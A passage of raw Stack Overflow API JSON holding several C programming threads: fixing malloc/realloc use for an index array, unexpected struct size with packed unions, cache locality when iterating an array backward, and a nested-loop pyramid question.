"post_id": 48782531, "comment_id": 84568105, "body": "@DavidC.Rankin that&#39;s totally true, will change that in the code"}, {"owner": {"reputation": 68403, "user_id": 3422102, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/Tg0Gt.png?s=128&g=1", "display_name": "David C. Rankin", "link": "https://stackoverflow.com/users/3422102/david-c-rankin"}, "edited": false, "score": 2, "creation_date": 1518599922, "post_id": 48782531, "comment_id": 84568356, "body": "That also means delaying <code>memory *= 2;</code> until after you validate <code>realloc</code> succeeded, so your <code>realloc</code> will look like  <code>void *tmp = realloc (indexOfCabin, (memory * 2 * sizeof *indexOfCabin)); if (!tmp) {&#47;* handle error *&#47; break; }; indexOfCabin = tmp; memory *= 2;</code>"}, {"owner": {"reputation": 278, "user_id": 5470770, "user_type": "registered", "accept_rate": 77, "profile_image": "https://www.gravatar.com/avatar/e3348aa561631114656f1e7d0488bcac?s=128&d=identicon&r=PG&f=1", "display_name": "anderssinho", "link": "https://stackoverflow.com/users/5470770/anderssinho"}, "reply_to_user": {"reputation": 68403, "user_id": 3422102, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/Tg0Gt.png?s=128&g=1", "display_name": "David C. Rankin", "link": "https://stackoverflow.com/users/3422102/david-c-rankin"}, "edited": false, "score": 0, "creation_date": 1518604321, "post_id": 48782531, "comment_id": 84571227, "body": "@DavidC.Rankin thanks the solution! And understand why you suggest this. It&#39;s now implemented in my code. Will update this post also with the change"}], "tags": [], "owner": {"reputation": 278, "user_id": 5470770, "user_type": "registered", "accept_rate": 77, "profile_image": "https://www.gravatar.com/avatar/e3348aa561631114656f1e7d0488bcac?s=128&d=identicon&r=PG&f=1", "display_name": "anderssinho", "link": "https://stackoverflow.com/users/5470770/anderssinho"}, "is_accepted": false, "score": 0, "last_activity_date": 1518599537, "last_edit_date": 1518599537, "creation_date": 1518596310, "answer_id": 48782531, "question_id": 48782089, "link": "https://stackoverflow.com/questions/48782089/creating-a-int-with-malloc-and-then-use-realloc-when-full/48782531#48782531", "title": "Creating a int * with malloc and then use realloc when full", "body": "<p>Okay after some help in the comment section I solved the problem with this edited code segment.</p>\n\n<pre><code>void showAvailable(CabinHolder *holder, Booking *booking)\n{\n    system(\"cls\");\n\n    printf(\"Choose cabin number \\n\");\n    printf(\"Start week: %d \\t End week: %d\\n\", booking-&gt;rentPeriod[0], booking-&gt;rentPeriod[1]);\n    printf(\"------------------------------------------\\n\");\n\n    int memory = 5;\n    int *indexOfCabin = malloc(sizeof(int)*memory);\n    int counter = 1;\n    int items = 0;\n    int choice = 0;\n\n    for (int i = 0; i &lt; CABINS; i++)\n    {\n        if (counter-1 == memory)\n        {\n            memory *= 2;\n            indexOfCabin = realloc(indexOfCabin, (memory * sizeof(int)));\n        }\n\n        if (booking-&gt;cabin-&gt;typeOfCabin == holder-&gt;arrofCabin[i].typeOfCabin)\n        {\n            printf(\"%d. \\t Cabin with number %d \\t cost: %d per week\\n\", counter, holder-&gt;arrofCabin[i].nr, holder-&gt;arrofCabin[i].cost);\n            counter++;\n            indexOfCabin[items++] = i;\n        }\n    }\n    free(indexOfCabin);\n    system(\"pause\");\n}\n</code></pre>\n\n<p>First: Problem was indexOfCabin = &amp;i throws away the memory you allocated, and puts the address of i into the pointer instead of what I wanted to do. Now we store the index in i in the pointer.</p>\n\n<p>Second: indexOfCabin can be used like an array, e.g. indexOfCabin[counter] = i;. But counter needs to start at 0, and should be incremented after being used. And indexOfCabin should not be incremented</p>\n"}], "owner": {"reputation": 278, "user_id": 5470770, "user_type": "registered", "accept_rate": 77, "profile_image": "https://www.gravatar.com/avatar/e3348aa561631114656f1e7d0488bcac?s=128&d=identicon&r=PG&f=1", "display_name": "anderssinho", "link": "https://stackoverflow.com/users/5470770/anderssinho"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 546, "favorite_count": 0, "answer_count": 1, "score": 2, "last_activity_date": 1518599537, "creation_date": 1518594482, "question_id": 48782089, "link": "https://stackoverflow.com/questions/48782089/creating-a-int-with-malloc-and-then-use-realloc-when-full", "title": "Creating a int * with malloc and then use realloc when full", "body": "<p>In a function I created am I trying to allocate a int array dynamically to store some index values.\nFirst I create the int * with the malloc function and then let the loop store som values in it and increament the pointer each time.\nThe problem I run in to starts when I try to use the realloc to increase the memory allocation.\nWhen I do this VS tells me it runs in to undefined behaviour and breaks the program.</p>\n\n<p>The code looks like this</p>\n\n<pre><code>void showAvailable(CabinHolder *holder, Booking *booking)\n{\n    system(\"cls\");\n\n    printf(\"Choose cabin number \\n\");\n    printf(\"Start week: &amp;d \\t End week: %d\", booking-&gt;rentPeriod[0], booking-&gt;rentPeriod[1]);\n    printf(\"------------------------------------------\\n\");\n\n    int memory = 5;\n    int *indexOfCabin = (int *)malloc(sizeof(int)*memory);\n    int counter = 1;\n\n    for (int i = 0; i &lt; CABINS; i++)\n    {\n        if (counter == memory)\n        {\n            memory *= 2;\n            int *expanded = realloc(indexOfCabin, (memory * sizeof(int)));\n            indexOfCabin = expanded;\n            expanded = NULL;\n        }\n\n        if (booking-&gt;cabin-&gt;typeOfCabin == holder-&gt;arrofCabin[i].typeOfCabin)\n        {\n            printf(\"%d. \\t Cabin with number %d \\t cost: %d per week\\n\", counter, holder-&gt;arrofCabin[i].nr, holder-&gt;arrofCabin[i].cost);\n            counter++;\n            indexOfCabin = &amp;i;\n            indexOfCabin++;\n        }\n    }\n\n    free(indexOfCabin);\n    system(\"pause\");\n}\n</code></pre>\n\n<p>When I debugg in VS i also se that my pointer indexOfCabin seems to be undefined inside the if statement, which I don't understand.\nWhat have I missed here?</p>\n"}, {"tags": ["c", "struct", "sizeof", "structure-packing"], "comments": [{"owner": {"reputation": 21147, "user_id": 7733418, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b08876b87c096cd006f66820ffc67f27?s=128&d=identicon&r=PG", "display_name": "Yunnosch", "link": "https://stackoverflow.com/users/7733418/yunnosch"}, "edited": false, "score": 1, "creation_date": 1518594107, "post_id": 48781938, "comment_id": 84565205, "body": "Try to prove your assumptions. Show the size of only the union and of only the inner struct."}, {"owner": {"reputation": 14233, "user_id": 916000, "user_type": "registered", "accept_rate": 95, "profile_image": "https://i.stack.imgur.com/eumU0.png?s=128&g=1", "display_name": "Taha Paksu", "link": "https://stackoverflow.com/users/916000/taha-paksu"}, "edited": false, "score": 2, "creation_date": 1518594201, "post_id": 48781938, "comment_id": 84565253, "body": "You might be experiencing data structure packing/padding. <a href=\"https://en.wikipedia.org/wiki/Data_structure_alignment\" rel=\"nofollow noreferrer\">en.wikipedia.org/wiki/Data_structure_alignment</a>"}, {"owner": {"reputation": 14233, "user_id": 916000, "user_type": "registered", "accept_rate": 95, "profile_image": "https://i.stack.imgur.com/eumU0.png?s=128&g=1", "display_name": "Taha Paksu", "link": "https://stackoverflow.com/users/916000/taha-paksu"}, "edited": false, "score": 1, "creation_date": 1518594230, "post_id": 48781938, "comment_id": 84565265, "body": "Or <a href=\"https://stackoverflow.com/questions/119123/why-isnt-sizeof-for-a-struct-equal-to-the-sum-of-sizeof-of-each-member\" title=\"why isnt sizeof for a struct equal to the sum of sizeof of each member\">stackoverflow.com/questions/119123/&hellip;</a>"}, {"owner": {"reputation": 15260, "user_id": 1968182, "user_type": "registered", "accept_rate": 0, "profile_image": "https://i.stack.imgur.com/E5nF2.jpg?s=128&g=1", "display_name": "Ulrich Eckhardt", "link": "https://stackoverflow.com/users/1968182/ulrich-eckhardt"}, "edited": false, "score": 0, "creation_date": 1518594483, "post_id": 48781938, "comment_id": 84565380, "body": "What is the layout, i.e. the relative offsets of the parts? Also, you know that things like padding is introduced to provide alignment guarantees for the CPU. Not having these has multiple bad effects, from slowdowns to crashes."}, {"owner": {"reputation": 1761, "user_id": 1576462, "user_type": "registered", "accept_rate": 45, "profile_image": "https://i.stack.imgur.com/hlcUu.jpg?s=128&g=1", "display_name": "fatdragon", "link": "https://stackoverflow.com/users/1576462/fatdragon"}, "edited": false, "score": 0, "creation_date": 1518595457, "post_id": 48781938, "comment_id": 84565842, "body": "thanks all! makes perfect sense."}], "answers": [{"comments": [{"owner": {"reputation": 78982, "user_id": 1848654, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/84180c0f3c9c04f8b8f0613fc0129dac?s=128&d=identicon&r=PG", "display_name": "melpomene", "link": "https://stackoverflow.com/users/1848654/melpomene"}, "edited": false, "score": 2, "creation_date": 1518594523, "post_id": 48782010, "comment_id": 84565403, "body": "I would&#39;ve expected 4 bytes of padding at the end of the inner structure."}, {"owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": false, "score": 0, "creation_date": 1518616787, "post_id": 48782010, "comment_id": 84579629, "body": "2 bites padding after <code>unsigned short a;</code>  lacks consistency  as then there would be 2 bites padding after <code>unsigned short v;</code> making size 20.  Go with  <a href=\"https://stackoverflow.com/questions/48781938/unexpected-size-when-a-struct-has-a-union#comment84565403_48782010\">@melpomene</a>"}, {"owner": {"reputation": 66473, "user_id": 694576, "user_type": "registered", "accept_rate": 71, "profile_image": "https://i.stack.imgur.com/PpOGj.jpg?s=128&g=1", "display_name": "alk", "link": "https://stackoverflow.com/users/694576/alk"}, "reply_to_user": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": false, "score": 0, "creation_date": 1518617878, "post_id": 48782010, "comment_id": 84580388, "body": "@chux: The 18 you get because the out <code>struct</code> <i>is</i> packed. I tested this (on cygwin, using gcc 4.9.2 :}) and it&#39;s in fact the inner <code>struct</code> which, when packed, makes <code>struct def</code> shrink from 18 to 14 bytes. Packing the <code>union</code>, BTW, does not change anything."}, {"owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": false, "score": 0, "creation_date": 1518621496, "post_id": 48782010, "comment_id": 84582989, "body": "Curious, with <code>offsetof(DEF,w.z.b) - offsetof(DEF,w.z.a)</code> do you get 2 or 4 or ?"}, {"owner": {"reputation": 66473, "user_id": 694576, "user_type": "registered", "accept_rate": 71, "profile_image": "https://i.stack.imgur.com/PpOGj.jpg?s=128&g=1", "display_name": "alk", "link": "https://stackoverflow.com/users/694576/alk"}, "reply_to_user": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": false, "score": 0, "creation_date": 1518624407, "post_id": 48782010, "comment_id": 84584926, "body": "@chux: 1st of all this expression &quot;<i>Packing the union, BTW, does not change anything</i>&quot; of mine is wrong, sry for this. 14 bytes I <i>only</i> get when packing both, the <code>union</code> <i>and</i> the inner <code>struct</code>. To answer your question: The result of <code>offsetof(DEF,w.z.b) - offsetof(DEF,w.z.a)</code> is <code>2</code> in of the four possible cases."}], "tags": [], "owner": {"reputation": 66473, "user_id": 694576, "user_type": "registered", "accept_rate": 71, "profile_image": "https://i.stack.imgur.com/PpOGj.jpg?s=128&g=1", "display_name": "alk", "link": "https://stackoverflow.com/users/694576/alk"}, "is_accepted": true, "score": 3, "last_activity_date": 1518602241, "last_edit_date": 1518602241, "creation_date": 1518594165, "answer_id": 48782010, "question_id": 48781938, "link": "https://stackoverflow.com/questions/48781938/unexpected-size-when-a-struct-has-a-union/48782010#48782010", "title": "Unexpected size when a struct has a union", "body": "<p><code>__attribute__((__packed__))</code> refers to <code>struct def</code> only. It does not pack the anonymous  <code>struct</code> inside the anonymous <code>union</code> inside <code>struct def</code>.</p>\n\n<p>So most likely those two members</p>\n\n<pre><code>                   unsigned short a;  /* 2 bytes */\n                   unsigned short b;  /* 2 bytes */\n</code></pre>\n\n<p>\"use\" 4 but 2 bytes.</p>\n\n<hr>\n\n<p>Unrelated to your question: C mandates to print <code>size_t</code>s using the <code>z</code> <em>length modifier</em>:</p>\n\n<pre><code> printf(\"size of DEF = %zu\\n\", sizeof (DEF));\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 18509, "user_id": 939410, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/bb161e6bf2e1dded07d3fd921f487334?s=128&d=identicon&r=PG", "display_name": "Art", "link": "https://stackoverflow.com/users/939410/art"}, "is_accepted": false, "score": 2, "last_activity_date": 1518594695, "creation_date": 1518594695, "answer_id": 48782138, "question_id": 48781938, "link": "https://stackoverflow.com/questions/48781938/unexpected-size-when-a-struct-has-a-union/48782138#48782138", "title": "Unexpected size when a struct has a union", "body": "<p>Writing:</p>\n\n<pre><code>struct foo {\n    struct bar {\n        ...\n    } x;\n};\n</code></pre>\n\n<p>Is not different than writing:</p>\n\n<pre><code>struct bar { ... };\nstruct foo {\n    struct bar x;\n};\n</code></pre>\n\n<p>Why does it matter? It matters because in the second example it should be obvious why the attributes that you apply to <code>foo</code> don't automatically apply to <code>bar</code>. This means that your outer struct will be packed, but that doesn't change what the components mean.</p>\n\n<p>The inner struct you have will not be packed and it's pretty obvious that if it follows the usual rules of alignment that most architectures follow its size will be a multiple of its most strictly aligned member which will be the pointer. So the size of the struct inside the union will be 16, not 12 as you assumed. Which means that the size of the union will be 16 as well.</p>\n"}], "owner": {"reputation": 1761, "user_id": 1576462, "user_type": "registered", "accept_rate": 45, "profile_image": "https://i.stack.imgur.com/hlcUu.jpg?s=128&g=1", "display_name": "fatdragon", "link": "https://stackoverflow.com/users/1576462/fatdragon"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 81, "favorite_count": 0, "accepted_answer_id": 48782010, "answer_count": 2, "score": 3, "last_activity_date": 1518602342, "creation_date": 1518593922, "last_edit_date": 1518602342, "question_id": 48781938, "link": "https://stackoverflow.com/questions/48781938/unexpected-size-when-a-struct-has-a-union", "title": "Unexpected size when a struct has a union", "body": "<p>I am trying to verify the size of a struct.  For some reasons, it's giving me a size of 18 rather than the expected 14 bytes (the union should have a max of 8 + 2 + 2 = 12 bytes).  Can someone help me?</p>\n\n<pre><code>typedef struct __attribute__((__packed__)) def\n{\n        union {\n                double x;   /* 8 bytes */\n                char *y;    /* 8 bytes as for 64-bit system */\n                struct {\n                        struct def *array; /* 8 bytes */\n                        unsigned short a;  /* 2 bytes */\n                        unsigned short b;  /* 2 bytes */\n                } z;\n        } w;\n        unsigned short v;  /* 2 bytes */\n} DEF, *DEFP;\n\nint main(int argc, char **argv) {\n        printf(\"size of DEF = %lu\\n\", sizeof(DEF));\n        printf(\"size of unsigned short = %lu\\n\", sizeof(unsigned short));\n        printf(\"size of struct def * = %lu\\n\", sizeof(struct def *));\n        printf(\"size of char * = %lu\\n\", sizeof(char *));\n        printf(\"size of double = %lu\\n\", sizeof(double));\n}\n</code></pre>\n\n<p>Here's what it displays when I run it:</p>\n\n<pre><code>$ gcc test.c &amp;&amp; ./a.out\nsize of DEF = 18\nsize of unsigned short = 2\nsize of struct def * = 8\nsize of char * = 8\nsize of double = 8\n</code></pre>\n"}, {"tags": ["c", "x86", "cpu-cache", "gcc7", "cache-locality"], "comments": [{"owner": {"reputation": 663663, "user_id": 15168, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/WtEI9.png?s=128&g=1", "display_name": "Jonathan Leffler", "link": "https://stackoverflow.com/users/15168/jonathan-leffler"}, "edited": false, "score": 3, "creation_date": 1518592206, "post_id": 48781358, "comment_id": 84564296, "body": "There&#39;s an off-by-one in your calculation; it would p+0 to p+63 (rather than p+64) if p is aligned on a 64-byte boundary.  Otherwise, it is <code>(p &amp; 0x3F)</code> to <code>(p &amp; 0x3F) + 0x3F</code>, assuming <code>p</code> is treated as a <code>char *</code> (you can&#39;t do arithmetic on a <code>void *</code> except in GCC and compilers emulating GCC).  And it means that reading backwards loads up a cache line when you start at the end and work backwards, so the performance won&#39;t be that much different from working forwards.  What would be bad in a 2D array would reading down columns instead of across rows; that really would hit the cache hard."}, {"owner": {"reputation": 153119, "user_id": 584518, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/RZLo7.png?s=128&g=1", "display_name": "Lundin", "link": "https://stackoverflow.com/users/584518/lundin"}, "edited": false, "score": 0, "creation_date": 1518612972, "post_id": 48781358, "comment_id": 84577095, "body": "One loop does <code>100000000</code> laps, the other counts from <code>100000000</code> down to 0-wrap-around, down to <code>UINT_MAX</code>. Which is not necessarily the same as <code>SIZE_MAX</code>. Don&#39;t try to be smart with bitwise operators. Also, <code>SIZE_MAX</code> is not necessarily <code>~(size_t)0</code> so all assumptions are wrong to begin with."}], "answers": [{"comments": [{"owner": {"reputation": 114796, "user_id": 214671, "user_type": "registered", "accept_rate": 78, "profile_image": "https://www.gravatar.com/avatar/f82954c7134fbe63282dc033fd52f3ab?s=128&d=identicon&r=PG", "display_name": "Matteo Italia", "link": "https://stackoverflow.com/users/214671/matteo-italia"}, "edited": false, "score": 2, "creation_date": 1518592543, "post_id": 48781545, "comment_id": 84564476, "body": "The corollary is: sequential (in any direction) = good, remaining &quot;in the same zone&quot; = good, jumping around in memory = bad."}], "tags": [], "owner": {"reputation": 31945, "user_id": 3386109, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/zt9UL.png?s=128&g=1", "display_name": "user3386109", "link": "https://stackoverflow.com/users/3386109/user3386109"}, "is_accepted": false, "score": 4, "last_activity_date": 1518592259, "creation_date": 1518592259, "answer_id": 48781545, "question_id": 48781358, "link": "https://stackoverflow.com/questions/48781358/cpu-spatial-cache-locality-in-array-iteration/48781545#48781545", "title": "CPU spatial cache locality in array iteration", "body": "<blockquote>\n  <p>If I access memory at address <code>p</code>, it will load the entire block from\n  <code>p</code> to <code>p + 64</code> into the cache.</p>\n</blockquote>\n\n<p>Not exactly. What the processor loads is the cache line that contains <code>p</code>. For example if <code>p</code> is 0x1234, then the cache line 0x1200 to 0x123F is loaded. As a result, scanning backwards through an array won't be much different than scanning forwards. </p>\n"}, {"tags": [], "owner": {"reputation": 17597, "user_id": 2016408, "user_type": "registered", "accept_rate": 60, "profile_image": "https://i.stack.imgur.com/TVba8.jpg?s=128&g=1", "display_name": "Leeor", "link": "https://stackoverflow.com/users/2016408/leeor"}, "is_accepted": true, "score": 6, "last_activity_date": 1518598361, "creation_date": 1518598361, "answer_id": 48783039, "question_id": 48781358, "link": "https://stackoverflow.com/questions/48781358/cpu-spatial-cache-locality-in-array-iteration/48783039#48783039", "title": "CPU spatial cache locality in array iteration", "body": "<p>To expand on the previous answer: </p>\n\n<p>Loading a full cache line granularity means that going forward or backward doesn't matter, once you hit one side of the line you get all of it.  This is of course only applicable for cacheable loads and memtypes (+streaming cases that could be hit while still in the buffers).</p>\n\n<p>However, this is not the full story. Modern CPUs employ hardware prefetchers that are very good in dealing with spatial locality - these would increase the granularity by prefetching additional cachelines in the same direction you're progressing. Exiting prefetchers depend on the exact architecture you're using, but common ones include next-line, adjacent-line (+/- 1 line), a stream of next lines, or IP-based strides. More info <a href=\"https://software.intel.com/en-us/articles/disclosure-of-hw-prefetcher-control-on-some-intel-processors\" rel=\"noreferrer\">here </a>.</p>\n\n<p>These prefetchers should be symmetrical, but we don't know for sure (the exact details are not disclosed), they may have different chances or thresholds for different directions.</p>\n\n<p>Another point is that cachegrind is just a cache simulation, it doesn't include effects like prefetching, and doesn't even model an accurate cache (the sizes should be ok, but replacement policy and other micro-architectural details aren't guaranteed to be the same), so you won't see the full effect. It's probably better to view the actual HW behavior using perf counters.</p>\n"}], "owner": {"reputation": 7937, "user_id": 1413793, "user_type": "registered", "accept_rate": 76, "profile_image": "https://www.gravatar.com/avatar/8c593877e04020316731318e597c80e4?s=128&d=identicon&r=PG&f=1", "display_name": "user1413793", "link": "https://stackoverflow.com/users/1413793/user1413793"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 487, "favorite_count": 0, "accepted_answer_id": 48783039, "answer_count": 2, "score": 4, "last_activity_date": 1518598361, "creation_date": 1518591529, "question_id": 48781358, "link": "https://stackoverflow.com/questions/48781358/cpu-spatial-cache-locality-in-array-iteration", "title": "CPU spatial cache locality in array iteration", "body": "<p>My understanding of the L1 cache was that a memory fetch loads a cache line. Assuming the cache line size is 64 bytes, if I access memory at address <code>p</code>, it will load the entire block from <code>p</code> to <code>p + 64</code> into the cache. Thus, it is best to iterate through an array from left to right (rather than right to left) to maximize cache locality.</p>\n\n<p>However, I wrote example C code that allocates an array of 100 million chars, writes random values into it and sums it (copied below for reference). One version of the code sums from left to right and the other from right to left. When I benchmarked it, I got very simillar results (where \"clock cycles\" are measured in terms of <a href=\"https://www.gnu.org/software/libc/manual/html_node/CPU-Time.html\" rel=\"nofollow noreferrer\"><code>clock</code></a>. The code was compiled with no optimizations.</p>\n\n<p>So my question is: Do modern processors do something else than just \"cache the read + 64 bytes\"? Do they cache forwards and backwards? Can the compiler \"tell\" the processor the code is iterating backwards?</p>\n\n<p>For reference, I am running on <code>Mac OS X 10.13.3</code> using <code>gcc-7 (Homebrew GCC 7.2.0_1) 7.2.0</code> and an x86-64 Intel processor with a cache line of 64 bytes.</p>\n\n<p>Benchmakrs:</p>\n\n<pre><code>$ ./a.out\nBackward Iterating...took 150101 clock cycles\n\n$ ./a.out\nForward Iterating...took 146545 clock cycles\n</code></pre>\n\n<p>I would have expected forward iteration to be about 64x faster as every 64 elements should be a cache hit whereas with the backward iteration, every element should be a cache miss.</p>\n\n<p>So, I called cachegrind on it. And the cache hit miss rate for both was pretty much the same:</p>\n\n<pre><code># Left to right iteration\n==21773==\n==21773== I   refs:      4,006,996,067\n==21773== I1  misses:            5,183\n==21773== LLi misses:            3,019\n==21773== I1  miss rate:          0.00%\n==21773== LLi miss rate:          0.00%\n==21773==\n==21773== D   refs:      1,802,393,260  (1,401,627,925 rd   + 400,765,335 wr)\n==21773== D1  misses:        3,153,101  (    1,588,104 rd   +   1,564,997 wr)\n==21773== LLd misses:        3,004,885  (    1,440,660 rd   +   1,564,225 wr)\n==21773== D1  miss rate:           0.2% (          0.1%     +         0.4%  )\n==21773== LLd miss rate:           0.2% (          0.1%     +         0.4%  )\n==21773==\n==21773== LL refs:           3,158,284  (    1,593,287 rd   +   1,564,997 wr)\n==21773== LL misses:         3,007,904  (    1,443,679 rd   +   1,564,225 wr)\n==21773== LL miss rate:            0.1% (          0.0%     +         0.4%  )\n\n# Right to left iteration\n==21931==\n==21931== I   refs:      4,006,996,453\n==21931== I1  misses:            5,198\n==21931== LLi misses:            3,045\n==21931== I1  miss rate:          0.00%\n==21931== LLi miss rate:          0.00%\n==21931==\n==21931== D   refs:      1,802,393,428  (1,401,628,038 rd   + 400,765,390 wr)\n==21931== D1  misses:        3,153,113  (    1,588,079 rd   +   1,565,034 wr)\n==21931== LLd misses:        3,135,505  (    1,571,219 rd   +   1,564,286 wr)\n==21931== D1  miss rate:           0.2% (          0.1%     +         0.4%  )\n==21931== LLd miss rate:           0.2% (          0.1%     +         0.4%  )\n==21931==\n==21931== LL refs:           3,158,311  (    1,593,277 rd   +   1,565,034 wr)\n==21931== LL misses:         3,138,550  (    1,574,264 rd   +   1,564,286 wr)\n==21931== LL miss rate:            0.1% (          0.0%     +         0.4%  )\n</code></pre>\n\n<p>Code:</p>\n\n<pre><code>#include &lt;stdint.h&gt;\n#include &lt;time.h&gt;\n#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n\n#define BUF_SIZE 100000000\n\nint main() {\n  srand(time(NULL));\n  uint8_t *buf1 = (uint8_t *)malloc(BUF_SIZE);\n  // Fill the buf with random data\n  for (size_t i = 0; i &lt; BUF_SIZE; ++i) {\n    buf1[i] = rand();\n  }\n\n#ifdef BACKWARDS\n  printf(\"Backward Iterating...\");\n#else\n  printf(\"Forward Iterating...\");\n#endif\n\n  uint64_t sum = 0;\n  clock_t start = clock();\n#ifdef BACKWARDS\n  for (size_t i = BUF_SIZE - 1; i != ~0; --i) {\n#else\n  for (size_t i = 0; i &lt; BUF_SIZE; ++i) {\n#endif\n    sum += buf1[i];\n  }\n  clock_t end = clock();\n  printf(\"took %lu clock cycles\\n\", end - start);\n  printf(\"sum: %llu\\n\", sum);\n  free(buf1);\n}\n</code></pre>\n"}, {"tags": ["c"], "comments": [{"owner": {"reputation": 18509, "user_id": 939410, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/bb161e6bf2e1dded07d3fd921f487334?s=128&d=identicon&r=PG", "display_name": "Art", "link": "https://stackoverflow.com/users/939410/art"}, "edited": false, "score": 2, "creation_date": 1518590073, "post_id": 48780997, "comment_id": 84563412, "body": "It won&#39;t. You are misreading something. Change the inner printf to <code>printf(&quot;%d %d &quot;, i, j);</code>."}, {"owner": {"reputation": 852, "user_id": 2711210, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/IKvJL.jpg?s=128&g=1", "display_name": "Chuk Ultima", "link": "https://stackoverflow.com/users/2711210/chuk-ultima"}, "edited": false, "score": 1, "creation_date": 1518590154, "post_id": 48780997, "comment_id": 84563454, "body": "I recommend you also print I and J.  It will make more sense."}, {"owner": {"reputation": 1302, "user_id": 2244021, "user_type": "registered", "accept_rate": 61, "profile_image": "https://i.stack.imgur.com/nkxwD.jpg?s=128&g=1", "display_name": "Serge Roussak", "link": "https://stackoverflow.com/users/2244021/serge-roussak"}, "edited": false, "score": 0, "creation_date": 1518590204, "post_id": 48780997, "comment_id": 84563477, "body": "Yep, I have tested your code at the <a href=\"http://cpp.sh\" rel=\"nofollow noreferrer\">cpp.sh</a>. It works, as expected."}, {"owner": {"reputation": 58995, "user_id": 1322972, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/puZFr.png?s=128&g=1", "display_name": "WhozCraig", "link": "https://stackoverflow.com/users/1322972/whozcraig"}, "edited": false, "score": 1, "creation_date": 1518590291, "post_id": 48780997, "comment_id": 84563514, "body": "Whatever evidence makes you believe that block is executing even when <code>j == i</code>, it belongs in your question, and how you drew your conclusion based on said-same. Adding instrumentation, as others have advised, will clarify far more about what is going on, rather than assuming you already know."}, {"owner": {"reputation": 31483, "user_id": 502381, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/74b99e687909be449e0130a50950eac7?s=128&d=identicon&r=PG&f=1", "display_name": "JJJ", "link": "https://stackoverflow.com/users/502381/jjj"}, "edited": false, "score": 2, "creation_date": 1518590330, "post_id": 48780997, "comment_id": 84563533, "body": "Note that the outer loop runs 5 times (from 0 to 4) but creates a pyramid 4 units high. That might have been the source of confusion."}, {"owner": {"reputation": 153119, "user_id": 584518, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/RZLo7.png?s=128&g=1", "display_name": "Lundin", "link": "https://stackoverflow.com/users/584518/lundin"}, "edited": false, "score": 0, "creation_date": 1518612432, "post_id": 48780997, "comment_id": 84576732, "body": "This would be the perfect time to start your debugger and single-step through this program."}], "answers": [{"comments": [{"owner": {"reputation": 71, "user_id": 7327892, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e9e577fa7eab60208e6a77e37614143e?s=128&d=identicon&r=PG&f=1", "display_name": "ThisNameWasTaken", "link": "https://stackoverflow.com/users/7327892/thisnamewastaken"}, "edited": false, "score": 0, "creation_date": 1518591106, "post_id": 48781144, "comment_id": 84563839, "body": "then it works only because I&#39;m printing a blank line in the beginning?"}, {"owner": {"reputation": 4598, "user_id": 9264702, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/mHczh.jpg?s=128&g=1", "display_name": "Stephen Docy", "link": "https://stackoverflow.com/users/9264702/stephen-docy"}, "reply_to_user": {"reputation": 71, "user_id": 7327892, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e9e577fa7eab60208e6a77e37614143e?s=128&d=identicon&r=PG&f=1", "display_name": "ThisNameWasTaken", "link": "https://stackoverflow.com/users/7327892/thisnamewastaken"}, "edited": false, "score": 0, "creation_date": 1518591315, "post_id": 48781144, "comment_id": 84563937, "body": "yeah, pretty much, if you want a 4 high pyramid without the blank line change the <code>&lt;=</code> in the <code>i</code> loop to <code>&lt;&#39; and the </code>&lt;` in the <code>j</code> loop to <code>&lt;=</code>"}, {"owner": {"reputation": 71, "user_id": 7327892, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e9e577fa7eab60208e6a77e37614143e?s=128&d=identicon&r=PG&f=1", "display_name": "ThisNameWasTaken", "link": "https://stackoverflow.com/users/7327892/thisnamewastaken"}, "edited": false, "score": 0, "creation_date": 1518591597, "post_id": 48781144, "comment_id": 84564049, "body": "You are right, Thanks Stephen Docy!"}, {"owner": {"reputation": 68403, "user_id": 3422102, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/Tg0Gt.png?s=128&g=1", "display_name": "David C. Rankin", "link": "https://stackoverflow.com/users/3422102/david-c-rankin"}, "edited": false, "score": 0, "creation_date": 1518591760, "post_id": 48781144, "comment_id": 84564105, "body": "Or avoid printing the blank line with <code>if (i) printf(&quot;\\n&quot;);</code> (which should be <code>putchar (&#39;\\n&#39;);</code> because you don&#39;t need to call <code>printf</code> for a single-character)"}], "tags": [], "owner": {"reputation": 4598, "user_id": 9264702, "user_type": 